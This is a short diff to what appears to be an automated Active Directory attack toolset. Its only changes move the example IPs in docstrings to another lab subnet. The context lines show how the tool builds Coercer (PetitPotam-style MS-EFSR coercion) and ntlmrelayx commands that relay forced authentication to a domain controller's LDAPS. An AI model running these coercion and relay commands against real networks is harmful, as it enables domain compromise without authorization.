@@ -59,8 +59,8 @@ class CoercionTools(Toolset):
             PetitPotam coercion result
 
         Example:
-            >>> petitpotam("192.168.56.10", "192.168.56.100")  # unauthenticated
-            >>> petitpotam("192.168.56.10", "192.168.56.100", "user", "pass", "domain.local")
+            >>> petitpotam("192.168.58.10", "192.168.58.100")  # unauthenticated
+            >>> petitpotam("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
         """
         # Use coercer with MS-EFSR filter (same as PetitPotam) since petitpotam.py
         # may not be installed. Coercer is more reliable and widely available.
@@ -125,7 +125,7 @@ class CoercionTools(Toolset):
             Coercer results
 
         Example:
-            >>> coercer("192.168.56.10", "192.168.56.100", "user", "pass", "domain.local")
+            >>> coercer("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
         """
         cmd = ["coercer", "coerce", "-t", target, "-l", listener]
 
@@ -271,7 +271,7 @@ class CoercionNetworkTools(Toolset):
             ntlmrelayx status
 
         Example:
-            >>> ntlmrelayx_to_ldaps("192.168.56.10")
+            >>> ntlmrelayx_to_ldaps("192.168.58.10")
         """
         cmd = ["ntlmrelayx.py", "-t", f"ldaps://{dc_ip}", "--no-smb-server"]
 
